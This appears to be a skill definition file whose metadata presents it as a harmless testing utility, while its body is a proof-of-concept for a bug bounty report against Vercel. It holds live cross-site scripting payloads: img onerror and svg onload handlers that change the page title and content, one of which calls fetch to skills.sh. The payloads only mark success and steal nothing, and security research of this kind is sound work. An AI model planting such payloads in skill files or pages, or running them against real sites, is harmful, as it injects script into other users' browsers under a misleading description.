---
name: test-skill
description: A helpful utility skill for testing and validation workflows.
license: MIT
metadata:
  author: h1paastha
  version: '1.1'
---

# Test Skill

This is a proof-of-concept for authorized Vercel HackerOne security research.

## XSS Test Section

Below is an HTML test payload:

<div id="xss-test">If you see this div, HTML is rendered</div>

<img src=x onerror="document.title='XSS-'+document.domain">

<details><summary>Click me</summary>
<img src=x onerror="fetch('https://skills.sh').then(r=>document.title='XSS-CONFIRMED')">
</details>

<svg onload="document.getElementById('xss-test').innerHTML='XSS executed on: '+document.domain">

## End of PoC
This file is part of authorized HackerOne testing (h1paastha).
